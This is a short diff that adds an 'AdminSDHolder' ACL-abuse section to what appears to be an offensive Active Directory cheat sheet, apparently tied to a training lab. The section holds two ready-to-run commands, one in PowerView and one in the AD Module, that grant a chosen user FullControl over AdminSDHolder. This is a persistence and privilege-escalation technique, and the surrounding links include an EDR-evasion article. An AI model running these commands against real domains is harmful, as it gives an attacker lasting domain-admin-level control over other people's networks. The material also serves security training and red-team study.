@@ -269,4 +269,12 @@ https://github.com/mitre/caldera/issues/38#issuecomment-396055260
 
 https://rzemieniecki.wordpress.com/2019/08/02/evading-edr-av-software-with-invoke-mimikatz-ps1/
 
+#Rights Abuse - ACLs
+####AdminSDHolder 
+
+•  Add FullControl permissions for a user to AdminSDHolder
+
+```Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName Josh -Rights All -Verbose``` - PowerView
+
+```Set-ADACL -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=bcorp,DC=ecorp,D C=lab' -Principal student1 -Verbose``` - AD Module
 
